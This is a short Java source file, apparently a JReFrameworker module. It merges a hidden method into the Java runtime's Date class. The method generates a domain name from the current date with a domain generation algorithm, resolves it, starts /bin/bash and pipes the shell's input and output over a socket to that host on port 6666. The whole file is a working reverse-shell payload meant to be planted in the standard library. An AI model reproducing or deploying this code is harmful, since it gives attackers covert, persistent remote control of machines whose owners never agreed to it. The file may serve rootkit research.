package java.lang;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Date;
import java.util.StreamForwarder;

import jreframeworker.annotations.methods.DefineMethod;
import jreframeworker.annotations.types.MergeType;

@MergeType
@SuppressWarnings("deprecation")
public class ReverseShellDGA extends Date {

	private static final long serialVersionUID = 1L;

	@DefineMethod
	private void reverseShell(){
		// leverages the Date logic to produce a predictable domain
		// https://en.wikipedia.org/wiki/Domain_generation_algorithm
		String domain = "www.";
		int year = getYear();
		int month = getMonth();
		int day = getDay();
		
		for(int i=0; i<16; i++){
			year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17);
			month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8);
	        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12);
	        domain += (char)(((year ^ month ^ day) % 25) + 97);
		}
		domain += ".com";

		try {
			System.out.println("Resolving domain: " + domain);
			InetAddress address = InetAddress.getByName(domain);
			String ipAddress = address.getHostAddress();
			// open reverse tcp connection
			// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
			final Process process = Runtime.getRuntime().exec("/bin/bash");
			Socket socket = new Socket(ipAddress, 6666);
			forwardStream(socket.getInputStream(), process.getOutputStream());
			forwardStream(process.getInputStream(), socket.getOutputStream());
			forwardStream(process.getErrorStream(), socket.getOutputStream());
			process.waitFor();
			socket.getInputStream().close();
			socket.getOutputStream().close();
			socket.close();
		} catch (Throwable t){
			t.printStackTrace();
		}
		
	}
	
	@DefineMethod
	private void forwardStream(final InputStream input, final OutputStream output) {
		new Thread(new StreamForwarder(input, output)).start();
	}
	
}
